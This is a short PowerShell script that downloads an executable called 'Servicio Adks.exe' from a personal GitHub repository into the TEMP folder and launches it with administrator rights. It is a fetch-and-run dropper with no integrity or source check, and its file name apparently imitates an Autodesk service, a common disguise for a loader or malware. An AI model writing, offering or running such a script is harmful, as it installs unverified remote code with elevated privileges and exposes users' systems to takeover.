$ErrorActionPreference = 'Stop'

$Url = 'https://github.com/usupres45/Adsk/raw/refs/heads/main/Servicio%20Adks.exe'
$Archivo = Join-Path $env:TEMP 'Servicio Adks.exe'

Invoke-WebRequest -Uri $Url -OutFile $Archivo
Start-Process -FilePath $Archivo -Verb RunAs -Wait
